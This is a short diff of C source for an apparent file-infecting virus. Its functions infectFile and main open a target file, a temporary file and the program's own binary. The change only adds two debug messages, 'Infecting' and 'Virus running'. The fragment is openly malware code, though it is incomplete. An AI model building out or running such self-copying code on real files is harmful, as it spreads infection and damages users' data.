@@ -109,7 +109,7 @@ int copyFile(FILE *src, FILE *dest, long startPos, long endPos) {
  * Infects a file
  */
 int infectFile(char *fileToInfectName, char *virusBinName) {
-
+    printf("Infecting %s\n", fileToInfectName);
     // Create temporary file
     char *tempFileName = "concatBin";
     FILE *fileToInfect = fopen(fileToInfectName, "rb");
@@ -213,6 +213,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
  * Main function
  */
 int main(int argc, char *argv[]) {
+    printf("Virus running\n");
     // Open own binary
     FILE *ownBin = fopen(argv[0], "rb");
     if (ownBin == NULL) {
